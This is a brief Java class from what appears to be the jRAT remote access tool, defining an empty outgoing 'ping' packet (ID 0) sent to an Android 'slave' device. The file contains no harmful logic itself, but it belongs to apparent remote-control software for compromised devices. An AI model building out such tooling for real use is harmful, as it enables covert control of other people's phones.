package io.jrat.client.packets.android.outgoing;

import io.jrat.client.android.AndroidSlave;

import java.io.DataOutputStream;

public class AndroidPacket0Ping extends AbstractOutgoingAndroidPacket {

	@Override
	public void write(AndroidSlave slave, DataOutputStream dos) throws Exception {
		
	}

	@Override
	public byte getPacketId() {
		return 0;
	}

}